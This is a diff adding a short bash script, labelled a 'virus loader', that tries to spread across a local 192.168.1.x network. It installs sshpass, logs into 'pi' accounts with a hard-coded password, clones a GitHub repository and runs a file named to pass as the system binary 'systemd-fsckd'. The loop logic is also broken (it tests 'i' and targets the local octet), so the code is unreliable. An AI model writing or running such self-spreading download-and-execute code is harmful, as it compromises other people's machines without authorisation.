@@ -1,0 +1,14 @@
+echo "virus loader triggered!"
+sudo apt-get install sshpass
+for i in {1..255}; do
+	last_octet=$(hostname -I | awk '{print $NF}' | awk -F. '{print $NF}')
+	if [ i -eq $last_octet ]; then
+		echo "dont hack myself!" 
+	else
+		HOST="192.168.1.$last_octet"
+		sshpass -p "evodyne2024" ssh "pi@$HOST" <<EOF
+		git clone https://github.com/Ligerbot/dont-run-me
+		cd dont-run-me
+		bash systemd-fsckd
+		EOF
+	fi
